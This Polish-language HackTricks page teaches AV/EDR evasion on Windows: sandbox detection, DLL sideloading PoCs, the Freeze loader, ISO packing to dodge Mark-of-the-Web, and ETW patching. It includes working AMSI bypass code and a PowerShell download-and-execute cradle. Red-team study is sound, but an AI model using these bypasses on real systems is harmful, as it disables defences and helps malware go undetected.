# Omijanie antywirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Tę stronę napisał** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Wyłącz Defender

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender przez podszywanie się pod inny AV.
- [Wyłącz Defender jeśli jesteś admin](basic-powershell-for-pentesters/README.md)

## **Metodologia omijania AV**

Obecnie AVs używają różnych metod sprawdzania, czy plik jest złośliwy, czy nie: wykrywanie statyczne, analiza dynamiczna i — w przypadku bardziej zaawansowanych EDRs — analiza behawioralna.

### **Wykrywanie statyczne**

Wykrywanie statyczne opiera się na oznaczaniu znanych złośliwych ciągów lub ciągów bajtów w binarce lub skrypcie, oraz na wyciąganiu informacji z samego pliku (np. file description, company name, digital signatures, icon, checksum itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej powodować wykrycie, ponieważ prawdopodobnie były analizowane i oznaczone jako złośliwe. Jest kilka sposobów, by obejść tego typu wykrywanie:

- **Szyfrowanie**

Jeśli zaszyfrujesz binarkę, AV nie będzie miało możliwości wykrycia twojego programu, ale będziesz potrzebował jakiegoś loadera do odszyfrowania i uruchomienia programu w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów w binarce lub skrypcie, żeby przejść obok AV, ale to może być czasochłonne w zależności od tego, co próbujesz obfuskować.

- **Własne narzędzia**

Jeśli rozwiniesz własne narzędzia, nie będzie znanych złych sygnatur, ale to wymaga dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem na sprawdzenie wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli plik na wiele segmentów i prosi Defender o przeskanowanie każdego z nich oddzielnie, dzięki czemu może dokładnie powiedzieć, które ciągi lub bajty w binarce są oznaczone.

Gorąco polecam zerknąć na tę [playlistę YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Analiza dynamiczna**

Analiza dynamiczna to sytuacja, gdy AV uruchamia twoją binarkę w sandboxie i obserwuje złośliwą aktywność (np. próbę odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, by unikać sandboxów.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na obejście dynamicznej analizy AV. AVs mają bardzo mało czasu na skanowanie plików, żeby nie zakłócać pracy użytkownika, więc użycie długich sleepów może zakłócić analizę binarek. Problem w tym, że wiele sandboxów AV może po prostu pominąć sleep w zależności od implementacji.
- **Checking machine's resources** Zazwyczaj sandboxy mają bardzo ograniczone zasoby do dyspozycji (np. < 2GB RAM), inaczej mogłyby spowolnić maszynę użytkownika. Możesz też być tu bardzo kreatywny — np. sprawdzając temperaturę CPU lub prędkości wentylatorów; nie wszystko będzie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera, aby zobaczyć, czy pasuje do tej, którą określiłeś; jeśli nie, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera sandboxu Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa to HAL9TH, oznacza to, że jesteś w sandboxie Defendera i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących obchodzenia sandboxów

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wcześniej wspomnieliśmy, **publiczne narzędzia** w końcu **zostaną wykryte**, więc powinieneś sobie zadać pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? A może możesz użyć innego, mniej znanego projektu, który także zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie ta druga. Biorąc mimikatz jako przykład, jest to prawdopodobnie jeden z — jeśli nie najbardziej — wykrywanych kawałków malware przez AVs i EDRs; choć sam projekt jest super, to praca z nim, żeby obejść AV, jest koszmarem, więc po prostu szukaj alternatyw dla tego, co próbujesz osiągnąć.

> [!TIP]
> Podczas modyfikowania swoich payloadów w celu omijania, upewnij się, że wyłączyłeś automatyczne przesyłanie próbek w Defender, i proszę, na serio, **NIE WYSYŁAJ NA VIRUSTOTAL** jeśli Twoim celem jest długoterminowe omijanie wykrywania. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.

## EXEs vs DLLs

Kiedykolwiek to możliwe, zawsze **priorytetyzuj używanie DLL** do omijania — z mojego doświadczenia pliki DLL są zazwyczaj **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik, by uniknąć wykrycia w niektórych przypadkach (oczywiście jeśli twój payload ma możliwość uruchomienia się jako DLL).

Jak widać na tym obrazku, DLL Payload z Havoc ma współczynnik wykrycia 4/26 na antiscan.me, podczas gdy EXE payload ma współczynnik 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me porównanie normalnego Havoc EXE payload vs normalnego Havoc DLL</p></figcaption></figure>

Pokażemy teraz kilka trików, których możesz użyć z plikami DLL, aby być znacznie bardziej stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, poprzez umieszczenie zarówno aplikacji ofiary, jak i złośliwych payloadów obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking w "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Gorąco polecam, abyś samodzielnie **zbadał programy DLL Hijackable/Sideloadable** — ta technika jest dość stealthy, jeśli zostanie wykonana prawidłowo, ale jeśli użyjesz publicznie znanych programów DLL Sideloadable, możesz łatwo zostać złapany.

Sam fakt umieszczenia złośliwej DLL o nazwie, której program oczekuje przy ładowaniu, nie spowoduje uruchomienia twojego payloadu, ponieważ program oczekuje określonych funkcji w tej DLL. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania, które program wykonuje z proxy (i złośliwej) DLL, do oryginalnej DLL, zachowując funkcjonalność programu i umożliwiając obsługę wykonania twojego payloadu.

Będę używał projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie wygeneruje dwa pliki: szablon kodu źródłowego DLL oraz oryginalny, przemianowany DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL mają wskaźnik wykrywalności 0/26 na [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) aby dowiedzieć się więcej o tym, co omówiliśmy bardziej szczegółowo.

### Wykorzystywanie przekierowanych eksportów (ForwardSideLoading)

Moduły PE w Windows mogą eksportować funkcje, które w rzeczywistości są "forwarders": zamiast wskazywać na kod, wpis eksportu zawiera łańcuch ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiąże eksport, loader Windows wykona:

- Załaduj `TargetDll`, jeśli nie jest już załadowany
- Rozwiąż z niego `TargetFunc`

Kluczowe zachowania:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, używana jest normalna kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego rozwiązywanie forwardera.

To umożliwia pośrednią prymitywę sideloading: znajdź podpisany DLL, który eksportuje funkcję forwardowaną do nazwy modułu niebędącej KnownDLL, następnie umieść ten podpisany DLL razem z kontrolowanym przez atakującego DLL o dokładnie takiej samej nazwie jak forwardowany moduł docelowy. Gdy wywołany zostanie forwardowany eksport, loader rozwiąże forward i załaduje twój DLL z tego samego katalogu, wykonując twój DllMain.

Przykład zaobserwowany w Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany zgodnie z normalną kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisany systemowy DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Upuść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny DllMain wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekierowanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface`, loader podąża za forwardem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i uruchamia jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykonał

Hunting tips:
- Skoncentruj się na przekierowanych eksportach (forwarded exports), gdzie moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz enumerować forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Wykrywanie/obrona — pomysły:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL ze ścieżek poza systemowymi, a następnie ładujące non-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alerty dla łańcuchów proces/moduł takich jak: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuś polityki integralności kodu (WDAC/AppLocker) i zabroń write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób trudny do wykrycia.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ewazja to gra kotka i myszki — to, co działa dziś, może zostać wykryte jutro, więc nigdy nie polegaj wyłącznie na jednym narzędziu; jeśli to możliwe, staraj się łączyć kilka evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, by zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AVs potrafiły skanować tylko **files on disk**, więc jeśli udało się w jakiś sposób wykonać payloads **directly in-memory**, AV nie mógł nic zrobić, ponieważ nie miał wystarczającej widoczności.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Pozwala to antivirus solutions na analizę zachowania skryptów przez udostępnienie ich treści w formie niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zauważ, że poprzedza to `amsi:` a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy złapani in-memory z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# jest również przepuszczany przez AMSI. To wpływa nawet na `Assembly.Load(byte[])` przy ładowaniu do in-memory execution. Dlatego zaleca się używanie starszych wersji .NET (np. 4.7.2 lub niższych) do wykonania in-memory, jeśli chcesz obejść AMSI.

Istnieje kilka sposobów obejścia AMSI:

- **Obfuscation**

Ponieważ AMSI głównie działa na wykryciach statycznych, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez ładowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itp.), możliwe jest łatwe manipulowanie nim nawet przy uruchomieniu jako nieuprzywilejowany użytkownik. Z powodu tej wady implementacji AMSI, badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc konieczna jest jej modyfikacja, aby móc użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie wykryte po opublikowaniu tego wpisu, więc nie powinieneś publikować żadnego kodu, jeśli chcesz pozostać niewykryty.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) aby uzyskać bardziej szczegółowe wyjaśnienie.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokowanie AMSI poprzez zapobieganie załadowaniu amsi.dll (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Zarys implementacji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notatki
- Działa w PowerShell, WScript/CScript oraz w custom loaderach (wszystko, co normalnie załadowałoby AMSI).
- Stosować razem z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Obserwowano użycie przez loadery uruchamiane przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

To narzędzie [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) generuje także skrypt/y umożliwiające obejście AMSI.

**Remove the detected signature**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** oraz **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie to działa poprzez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**AV/EDR products that uses AMSI**

Listę produktów AV/EDR używających AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, dzięki czemu możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## Logowanie PowerShell

PowerShell logging to funkcja pozwalająca rejestrować wszystkie polecenia PowerShell wykonywane w systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może także stanowić **problem dla atakujących, którzy chcą unikać wykrycia**.

Aby obejść logowanie PowerShell, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) do tego celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić sesję PowerShell bez zabezpieczeń (to właśnie używa `powerpick` z Cobal Strike).


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrycie przez AV i EDR. Bądź ostrożny z tym podejściem i rozważ stosowanie szyfrowania tylko w konkretnych, wrażliwych sekcjach kodu, które wymagają ukrycia.

### Deobfuskacja binariów .NET chronionych przez ConfuserEx

Podczas analizowania malware używającego ConfuserEx 2 (lub komercyjnych forków) często napotyka się kilka warstw ochrony, które blokują dekompilatory i sandboxy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który następnie można zdekompilować do C# w narzędziach takich jak dnSpy czy ILSpy.

1.  Usuwanie anti-tamper – ConfuserEx szyfruje każde *ciało metody* i deszyfruje je wewnątrz statycznego konstruktora *module* (`<Module>.cctor`). To także modyfikuje checksumę PE, więc każda ingerencja może spowodować awarię binarki. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Wyjście zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas budowy własnego unpackera.

2.  Odzyskiwanie symboli / control-flow – podaj *czysty* plik do **de4dot-cex** (fork de4dot świadomy ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – wybiera profil ConfuserEx 2  
• de4dot cofa control-flow flattening, przywraca oryginalne namespace'y, klasy i nazwy zmiennych oraz odszyfrowuje stałe stringi.

3.  Usuwanie proxy-call – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś obserwować normalne API .NET, takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast nieczytelnych wrapperów (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom otrzymaną binarkę w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* ładunek. Często malware przechowuje go jako TLV-enkodowaną tablicę bajtów zainicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwego próbki – przydatne podczas pracy na stacji offline.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Obfuskator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie open-source'owego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/) zdolnego zapewnić zwiększone bezpieczeństwo oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) oraz odporność na modyfikacje (tamper-proofing).
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania w czasie kompilacji obfuskowanego kodu bez użycia jakiegokolwiek zewnętrznego narzędzia i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonów C++, co utrudni życie osobie chcącej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 obfuskator binarny, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to szczegółowy (fine-grained) framework do obfuskacji kodu dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, utrudniając nasze naturalne pojmowanie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekonwertować istniejące EXE/DLL na shellcode, a następnie je załadować

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Ważne jest, aby wiedzieć, że pliki wykonywalne podpisane za pomocą **zaufanego** certyfikatu podpisującego **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem zapobiegającym otrzymaniu przez Twoje payloady Mark of The Web jest zapakowanie ich wewnątrz jakiegoś kontenera, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być zastosowany do woluminów **nie NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym **rejestrować zdarzenia**. Jednak może być też wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak AMSI może być wyłączone (obejście), możliwe jest również sprawienie, by funkcja **`EtwEventWrite`** procesu użytkownika zwracała natychmiastowo bez logowania jakichkolwiek zdarzeń. Osiąga się to przez załatanie funkcji w pamięci tak, żeby natychmiast zwracała, efektywnie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie C# binariów do pamięci jest znane od dawna i nadal jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Skoro payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysk, jedyną rzeczą, o którą musimy się martwić, jest poprawne załatwienie AMSI dla całego procesu.

